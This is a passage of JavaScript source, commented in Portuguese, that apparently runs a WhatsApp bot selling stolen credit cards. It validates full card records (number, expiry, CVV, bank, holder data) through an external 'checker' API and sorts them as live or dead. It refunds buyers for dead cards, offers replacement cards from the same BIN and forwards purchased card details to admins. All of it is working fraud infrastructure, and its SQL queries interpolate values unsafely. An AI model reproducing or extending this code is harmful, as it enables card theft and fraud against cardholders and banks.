                        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳
                        console.log('\x1b[33m%s\x1b[0m', LinhaAtual())

                        for await (Grupo of ID_GRUPOS) {
                            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Grupo["ID_GRUPO"]}', 
'sendImage',
'${Texto_Grupo}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Comprou_CC_GP}',
'${Date.now()}')`).run()
                        }
                    }

                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())

                    COMOCHECOU = ""
                    OCULTARCHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'OCULTARCHK'`).get()["VALOR"]
                    if (OCULTARCHK === "1") {
                        CCOMOCHECOU = "API Oculta por segurança!"
                    } else {
                        COMOCHECOU = URL_CHK_COM_CC
                    }
                    Texto_Adms = `🔱 *CC COMPRADA COM SUCESSO* 🔱

👤 *NÚMERO DO USUÁRIO:* wa.me/${Numero_CHK}
💰 *VALOR CC:* R$: ${VALOR_CC_CHK}

💳 *CARTÃO:* ${NUMERO_CC_CHK}|${MES_CC_CHK}|${ANO_CC_CHK}|${CVV_CC_CHK}
🏳️ *BANDEIRA:* ${BANDEIRA_CC_CHK}
⚜️ *TIPO:* ${TIPO_CC_CHK}
💠 *NIVEL:* ${NIVEL_CC_CHK}
🏛 *BANCO:* ${BANCO_CC_CHK}
🌍 *PAIS:* ${PAIS_CC_CHK}

👤 *DADOS:* ${DADOS_CC_CHK}

────────────────

*COMO FOI CHECADO*

${COMOCHECOU}

────────────────

*PALAVRAS CONFIGURADAS*

*PALAVRA QUANDO DA LIVE1:* ${PALAVRA_LIVE_CHK}
*PALAVRA QUANDO DA LIVE2:* ${PALAVRA_LIVE2_CHK}
*PALAVRA QUANDO DA LIVE3:* ${PALAVRA_LIVE3_CHK}

*PALAVRA QUANDO DA DIE1:* ${PALAVRA_DIE_CHK}
*PALAVRA QUANDO DA DIE2:* ${PALAVRA_DIE2_CHK}
*PALAVRA QUANDO DA DIE3:* ${PALAVRA_DIE3_CHK}

────────────────

*RETORNO DA API:*

${Retorno_Checker}`
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())

                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto_Adms}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                    console.log(`CC Comprada! Numero: wa.me/${Numero_CHK} | Valor: ${VALOR_CC_CHK}`)
                    ITEM_FILA_CHKV2 = "VAMOS PARA A PROXIMA CC"
                    return;













                } else if (Retorno_Checker.toString().indexOf(PALAVRA_DIE_CHK) > -1 || Retorno_Checker.toString().indexOf(PALAVRA_DIE2_CHK) > -1 || Retorno_Checker.toString().indexOf(PALAVRA_DIE3_CHK) > -1) {
                    //DEU DIE
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                    if (PROCESSADO_CHK === "7") {

                        CHK_REEMBOLSO_COMO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_REEMBOLSO_COMO'`).get()["VALOR"]
                        if (CHK_REEMBOLSO_COMO === "1") {
                            if (PRIMEIRA_OU_SEGUNDA_VEZ === "1") {
                                console.log("Apenas Primária reembolsa e deu Die com ela. FIM")
                                await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '11' WHERE _rowid_ = '${ID_CHK}'`).run()
                            }
                        }
                        if (CHK_REEMBOLSO_COMO === "2") {
                            if (PRIMEIRA_OU_SEGUNDA_VEZ === "1") {
                                console.log("Apenas Secundária reembolsa e deu Die com ela. FIM")
                                await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '12' WHERE _rowid_ = '${ID_CHK}'`).run()
                            }
                        }
                        if (CHK_REEMBOLSO_COMO === "3") {
                            if (PRIMEIRA_OU_SEGUNDA_VEZ === "1") {
                                console.log("Pediu reembolso pela primeira vez, só que ao checar deu DIE, vou me preparar para a segunda checada na proxima.")
                                await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '13' WHERE _rowid_ = '${ID_CHK}'`).run()
                                ITEM_FILA_CHKV2 = "VAMOS PARA A PROXIMA CC"
                                return
                            }
                        }

                    }
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                    if (PROCESSADO_CHK === "13") {
                        if (PRIMEIRA_OU_SEGUNDA_VEZ === "2") {
                            console.log("Checou a CC na secundária pois a Primaria deu DIE e a secundária tbm DIE. FIM")
                            await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '15' WHERE _rowid_ = '${ID_CHK}'`).run()
                        }
                    }

                    if (PROCESSADO_CHK === "7" || PROCESSADO_CHK === "13") {
                        SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${CONTATO_CHK}'`).get()["SALDO"]
                        SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2)

                        NOVO_SALDO = parseFloat(SALDO_USUARIO) + parseFloat(VALOR_CC_CHK)
                        NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2)

                        await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${CONTATO_CHK}'`).run()

                        Texto = `*❌REALMENTE ESTA CC ESTÁ DIE, VOCÊ FOI REEMBOLSADO!*

*NÚMERO:* wa.me/${Numero_CHK}

*SALDO ANTERIOR:* R$: ${SALDO_USUARIO}

*VALOR REEMBOLSADO!:* R\$:${VALOR_CC_CHK}

*SALDO ATUAL:* R\$:${NOVO_SALDO}`
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${CONTATO_CHK}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                    }
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                    if (PROCESSADO_CHK === "1") {
                        if (USO_APIS_CHK === "3") {
                            console.log("Checou e Deu Die na primária e está esperando uma segunda checagem da api secundária.")
                            await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '3' WHERE _rowid_ = '${ID_CHK}'`).run()
                            ITEM_FILA_CHKV2 = "VAMOS PARA A PROXIMA CC"
                            return
                        } else {
                            console.log("Checou, Deu Die e fim.")
                            await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '4' WHERE _rowid_ = '${ID_CHK}'`).run()
                        }
                    }
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                    if (PROCESSADO_CHK === "3") {
                        console.log("Checou e Deu Die na segunda vez tbm e fim.")
                        await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '6' WHERE _rowid_ = '${ID_CHK}'`).run()
                    }

                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())

                    CHK_CHECAR_ATE_LIVE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_CHECAR_ATE_LIVE'`).get()["VALOR"]
                    if (CHK_CHECAR_ATE_LIVE === "1") {

                        if (Array_Cliente_Desistiu_Checagem.includes(CONTATO_CHK)) {
                            //REMOVER ITENS DA ARRAY
                            Array.prototype.remove = function () {
                                var what, a = arguments, L = a.length, ax;
                                while (L && this.length) {
                                    what = a[--L];
                                    while ((ax = this.indexOf(what)) !== -1) {
                                        this.splice(ax, 1);
                                    }
                                }
                                return this;
                            };
                            Array_Cliente_Desistiu_Checagem.remove(CONTATO_CHK);
                            Texto = `❌ *CC ID:${OUTRA_CC["rowid"]} DEU DIE!*

*NÃO IREI CHECAR OUTRA CC*`
                            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${CONTATO_CHK}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        } else {

                            Digito = NUMERO_CC_CHK.match(/./igm)
                            BIN = `${Digito[0]}${Digito[1]}${Digito[2]}${Digito[3]}${Digito[4]}${Digito[5]}`

                            OUTRA_CC = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CCS WHERE BIN = '${BIN}' AND TIPOCC = '${TIPOCC_CHK}' AND NUMERO != '${NUMERO_CC_CHK}' LIMIT 1`).get()
                            if (OUTRA_CC === undefined) {

                                CONSTRUCAO_LISTMESSAGE_buttonText = 'OUTRAS OPÇÕES DE CC'
                                CONSTRUCAO_LISTMESSAGE_title = 'OUTRAS OPÇÕES DE CC'
                                CONSTRUCAO_LISTMESSAGE_description = `❌ *CC DEU DIE! NÃO TEMOS MAIS CCS DA BIN ${BIN}, ESCOLHA OUTRA.*`

                                CONSTRUCAO_LISTMESSAGE_rows = []
                                iD_Footer = Date.now()

                                CONSTRUCAO_LISTMESSAGE_rows.push(
                                    {
                                        rowId: `${iD_Footer.toString()}|catalogo_ccs`,
                                        title: "💳 CCs",
                                        description: "Catálogo de CCs disponíveis no estoque.",
                                    },
                                )

                                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${CONTATO_CHK}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()

                            } else {

                                //                                 Texto = `❌ *CC ID:${OUTRA_CC["rowid"]} DEU DIE!*
                                // 🔎 *CHECANDO OUTRA CC DA BIN: ${BIN}* 💳

                                // _Para cancelar as checagens, basta digitar qualquer coisa..._`
                                //                                 await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
                                // '0',
                                // '${CONTATO_CHK}',
                                // 'sendText',
                                // '${Texto}',
                                // 'CONSTRUCAO_LISTMESSAGE_buttonText',
                                // 'CONSTRUCAO_LISTMESSAGE_title',
                                // 'CONSTRUCAO_LISTMESSAGE_rows',
                                // 'Caminho_arquivo',
                                // '${Date.now()}')`).run()

                                VALOR_FINAL_CC = await DataBase_Better.prepare(`SELECT
CCS.*,
CCS_PRECOS_BANDEIRA${Full}.VALOR AS VL_BANDEIRA,
CCS_PRECOS_NIVEL${Full}.VALOR AS VL_NIVEL,
CCS_PRECOS_BANCO${Full}.VALOR AS VL_BANCO,
CCS_PRECOS_PAIS${Full}.VALOR AS VL_PAIS,
(
CCS_PRECOS_BANDEIRA${Full}.VALOR + CCS_PRECOS_NIVEL${Full}.VALOR + CCS_PRECOS_BANCO${Full}.VALOR + CCS_PRECOS_PAIS${Full}.VALOR
) AS VL_TOTAL
FROM
CCS
LEFT JOIN CCS_PRECOS_BANDEIRA${Full} ON (
CCS.BANDEIRA = CCS_PRECOS_BANDEIRA${Full}.BANDEIRA
)

LEFT JOIN CCS_PRECOS_NIVEL${Full} ON (
CCS.NIVEL = CCS_PRECOS_NIVEL${Full}.NIVEL
)

LEFT JOIN CCS_PRECOS_BANCO${Full} ON (
CCS.BANCO = CCS_PRECOS_BANCO${Full}.BANCO
)

LEFT JOIN CCS_PRECOS_PAIS${Full} ON (
CCS.PAIS = CCS_PRECOS_PAIS${Full}.PAIS
)

LEFT JOIN CCS_PRECOS_BIN${Full} ON (
CCS.BIN = CCS_PRECOS_BIN${Full}.BIN
)
WHERE CCS_PRECOS_BIN${Full}.BIN = '${BIN}' LIMIT 1`).all()
                                //console.log(`VALOR TOTAL DA BIN:${BIN} | R$:${VALOR_FINAL_CC[0]["VL_TOTAL"]}`)
                                VALOR_FINAL_CC = VALOR_FINAL_CC[0]["VL_TOTAL"]

                                await DataBase_Better.prepare(`INSERT INTO CHECAR_CC_V2 (
CONTATO,
CC,
TIPOCC,
DADOS_CHECAGEM,
RESULTADO_CHK,
PROCESSADO,
VALOR_CC,
DATA_INSERIDO_MS) VALUES (
'${CONTATO_CHK}',
'${OUTRA_CC["NUMERO"]}|${OUTRA_CC["MES"]}|${OUTRA_CC["ANO"]}|${OUTRA_CC["CVV"]}',
'${OUTRA_CC["TIPOCC"]}',
'0',
'0',
'1',
'${VALOR_FINAL_CC}',
'${Date.now()}')`).run()

                            }

                        }


                    } else {
                        CONSTRUCAO_LISTMESSAGE_buttonText = 'OUTRAS OPÇÕES DE CC'
                        CONSTRUCAO_LISTMESSAGE_title = 'OUTRAS OPÇÕES DE CC'
                        CONSTRUCAO_LISTMESSAGE_description = `❌ *ESTA CC VEIO DIE, ESCOLHA OUTRA CC DO NOSSO ESTOQUE*`

                        CONSTRUCAO_LISTMESSAGE_rows = []
                        iD_Footer = Date.now()

                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|catalogo_ccs`,
                                title: "💳 CCs",
                                description: "Catálogo de CCs disponíveis no estoque.",
                            },
                        )

                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${CONTATO_CHK}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()

                    }


                    if (PROCESSADO_CHK === "7" || PROCESSADO_CHK === "13") {
                        COLUNA = "CCS_VENDIDAS"
                        Digito = NUMERO_CC_CHK.match(/./igm)
                        BIN_CC = `${Digito[0]}${Digito[1]}${Digito[2]}${Digito[3]}${Digito[4]}${Digito[5]}`
                    } else {
                        COLUNA = "CCS"
                        BIN_CC = await DataBase_Better.prepare(`SELECT BIN FROM ${COLUNA} WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()
                        console.log(`${NUMERO_CC_CHK} | ${JSON.stringify(BIN_CC)}`)
                        BIN_CC = BIN_CC["BIN"]
                    }
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                    MES_CC = await DataBase_Better.prepare(`SELECT MES FROM ${COLUNA} WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["MES"]
                    ANO_CC = await DataBase_Better.prepare(`SELECT ANO FROM ${COLUNA} WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["ANO"]
                    CVV_CC = await DataBase_Better.prepare(`SELECT CVV FROM ${COLUNA} WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["CVV"]
                    BANDEIRA_CC = await DataBase_Better.prepare(`SELECT BANDEIRA FROM ${COLUNA} WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["BANDEIRA"]
                    TIPO_CC = await DataBase_Better.prepare(`SELECT TIPO FROM ${COLUNA} WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["TIPO"]
                    NIVEL_CC = await DataBase_Better.prepare(`SELECT NIVEL FROM ${COLUNA} WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["NIVEL"]
                    BANCO_CC = await DataBase_Better.prepare(`SELECT BANCO FROM ${COLUNA} WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["BANCO"]
                    PAIS_CC = await DataBase_Better.prepare(`SELECT PAIS FROM ${COLUNA} WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["PAIS"]
                    TIPOCC_CC = await DataBase_Better.prepare(`SELECT TIPOCC FROM ${COLUNA} WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["TIPOCC"]
                    DADOS_CC = await DataBase_Better.prepare(`SELECT DADOS FROM ${COLUNA} WHERE NUMERO = '${NUMERO_CC_CHK}'`).get()["DADOS"]
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                    await DataBase_Better.prepare(`INSERT INTO CCS_DIE (BIN,NUMERO,MES,ANO,CVV,BANDEIRA,TIPO,NIVEL,BANCO,PAIS,DADOS,TIPOCC,NUMERO_TENTOU_COMPRAR,Data_MS_Inserido) VALUES ('${BIN_CC}','${NUMERO_CC_CHK}','${MES_CC}','${ANO_CC}','${CVV_CC}','${BANDEIRA_CC}','${TIPO_CC}','${NIVEL_CC}','${BANCO_CC}','${PAIS_CC}','${DADOS_CC}','${TIPOCC_CC}','${CONTATO_CHK}','${Date.now()}')`).run()
                    await DataBase_Better.prepare(`DELETE FROM ${COLUNA} WHERE NUMERO == ${NUMERO_CC_CHK}`).run()
                    COMOCHECOU = ""
                    OCULTARCHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'OCULTARCHK'`).get()["VALOR"]
                    if (OCULTARCHK === "1") {
                        COMOCHECOU = "API Oculta por segurança!"
                    } else {
                        COMOCHECOU = URL_CHK_COM_CC
                    }
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                    Texto = `❌ *CC CHECADA POR UM USER, DEU DIE*

*USUÁRIO:* wa.me/${Numero_CHK} 

*CC:* ${CC_CHK}

────────────────

*COMO FOI CHECADO*

${COMOCHECOU}

────────────────

*PALAVRAS CONFIGURADAS*

*PALAVRA QUANDO DA LIVE1:* ${PALAVRA_LIVE_CHK}
*PALAVRA QUANDO DA LIVE2:* ${PALAVRA_LIVE2_CHK}
*PALAVRA QUANDO DA LIVE3:* ${PALAVRA_LIVE3_CHK}

*PALAVRA QUANDO DA DIE1:* ${PALAVRA_DIE_CHK}
*PALAVRA QUANDO DA DIE2:* ${PALAVRA_DIE2_CHK}
*PALAVRA QUANDO DA DIE3:* ${PALAVRA_DIE3_CHK}

────────────────

*RETORNO DA API:*

${Retorno_Checker}`
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())

                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                    console.log(`❌ *CC CHECADA POR UM USER, DEU DIE*`)
                    ITEM_FILA_CHKV2 = "VAMOS PARA A PROXIMA CC"
                    return











                } else {
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())

                    await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '0' WHERE _rowid_ = '${ID_CHK}'`).run()

                    CONSTRUCAO_LISTMESSAGE_buttonText = 'OUTRAS OPÇÕES DE CC'
                    CONSTRUCAO_LISTMESSAGE_title = 'OUTRAS OPÇÕES DE CC'
                    CONSTRUCAO_LISTMESSAGE_description = `⚠️ *Algum erro ocorreu ao checarmos a CC, Escolha outra!*`

                    CONSTRUCAO_LISTMESSAGE_rows = []
                    iD_Footer = Date.now()

                    CONSTRUCAO_LISTMESSAGE_rows.push(
                        {
                            rowId: `${iD_Footer.toString()}|catalogo_ccs`,
                            title: "💳 CCs",
                            description: "Catálogo de CCs disponíveis no estoque.",
                        },
                    )

                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${CONTATO_CHK}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()

                    COMOCHECOU = ""
                    OCULTARCHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'OCULTARCHK'`).get()["VALOR"]
                    if (OCULTARCHK === "1") {
                        COMOCHECOU = "API Oculta por segurança!"
                    } else {
                        COMOCHECOU = URL_CHK_COM_CC
                    }
                    Texto = `⚠️ *ATENÇÃO, NÃO ENCONTREI AS PALAVRAS CONFIGURADAS POR VOCÊ, NO RETORNO DA API DE CHECKER*

*USUÁRIO:* wa.me/${Numero_CHK} 

*CC:* ${CC_CHK}

────────────────

*COMO FOI CHECADO*

${COMOCHECOU}

────────────────

*PALAVRAS CONFIGURADAS*

*PALAVRA QUANDO DA LIVE1:* ${PALAVRA_LIVE_CHK}
*PALAVRA QUANDO DA LIVE2:* ${PALAVRA_LIVE2_CHK}
*PALAVRA QUANDO DA LIVE3:* ${PALAVRA_LIVE3_CHK}

*PALAVRA QUANDO DA DIE1:* ${PALAVRA_DIE_CHK}
*PALAVRA QUANDO DA DIE2:* ${PALAVRA_DIE2_CHK}
*PALAVRA QUANDO DA DIE3:* ${PALAVRA_DIE3_CHK}

────────────────

*RETORNO DA API:*

${Retorno_Checker}`
                    console.log('\x1b[33m%s\x1b[0m', LinhaAtual())

                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }

                    console.log(`⚠️ *ATENÇÃO, NÃO ENCONTREI AS PALAVRAS CONFIGURADAS POR VOCÊ, NO RETORNO DA API DE CHECKER*`)
                    ITEM_FILA_CHKV2 = "VAMOS PARA A PROXIMA CC"
                    return
                }

            } catch (error) {
                console.log(error)
                console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                ITEM_FILA_CHKV2 = "VAMOS PARA A PROXIMA CC"

                await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '0' WHERE _rowid_ = '${ID_CHK}'`).run()

                Texto = `Ocorreu algum erro no checker ao checar esta CC, não se preocupe, basta escolher outra! seu saldo continua intacto.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${CONTATO_CHK}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                COMOCHECOU = ""
                OCULTARCHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'OCULTARCHK'`).get()["VALOR"]
                if (OCULTARCHK === "1") {
                    COMOCHECOU = "API Oculta por segurança!"
                } else {
                    COMOCHECOU = URL_CHK_COM_CC
                }

                Texto = `⚠️ *OCORREU UM ERRO NÃO ESPERADO NA FUNÇÃO DE CHECAR CC*

*USUÁRIO:* wa.me/${Numero_CHK} 

*CC:* ${CC_CHK}

────────────────

*COMO FOI CHECADO*

${COMOCHECOU}

────────────────

*RETORNO DA API:*

${Retorno_Checker}

────────────────

*INFORMAÇÕES SOBRE O ERRO*

${error} | ${JSON.stringify(error)}`
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                console.log(`⚠️ *ATENÇÃO, NÃO ENCONTREI AS PALAVRAS CONFIGURADAS POR VOCÊ, NO RETORNO DA API DE CHECKER*`)
                ITEM_FILA_CHKV2 = "VAMOS PARA A PROXIMA CC"
                return
            }


        });
    }, 1000);
}

function LinhaAtual(Mensagem) {
    let e = new Error();
    let frame = e.stack.split("\n")[2];
    let lineNumber = frame.split(":").reverse()[1];
    let functionName = frame.split(" ")[5];
    return `Linha:${lineNumber} | ${Mensagem}`////console.log('\x1b[33m%s\x1b[0m',LinhaAtual("Mensagem"))
}

ITEM_FILA_PACOTE = "ACABEI"
async function Fila_Montar_Pacote_Enviar(client) {
    setInterval(async function () {
        if (ITEM_FILA_PACOTE === "TO PREPARANDO PACOTE PARA ENVIAR") {
            //console.log("TO PREPARANDO PACOTE PARA ENVIAR")
            return
        }

        ITEM_FILA_PACOTE = await DataBase_Better.prepare(`SELECT _rowid_,* FROM PREPARAR_PACOTEV3 WHERE PROCESSADO = '0' LIMIT 1`).get()
        if (ITEM_FILA_PACOTE === undefined) {
            ITEM_FILA_PACOTE = "NÃO TEM PACOTE PARA PREPARAR"
            return
        } else {
            /*
            PROCESSADO = 0 => Só fica zero quando dar algum erro na checagem, a CC continua no estoque.
            PROCESSADO = 1 => Montado e entregue
            */

            ID_PACOTE = ITEM_FILA_PACOTE["rowid"]
            CONTATO_PACOTE = ITEM_FILA_PACOTE["CONTATO"]
            QUANTIDADE_PACOTE = ITEM_FILA_PACOTE["QUANTIDADE"]
            VALOR_PACOTE = ITEM_FILA_PACOTE["VALOR"]
            COLUNA_PACOTE = ITEM_FILA_PACOTE["COLUNA"]
            PARAMETRO_PACOTE = ITEM_FILA_PACOTE["PARAMETRO"]
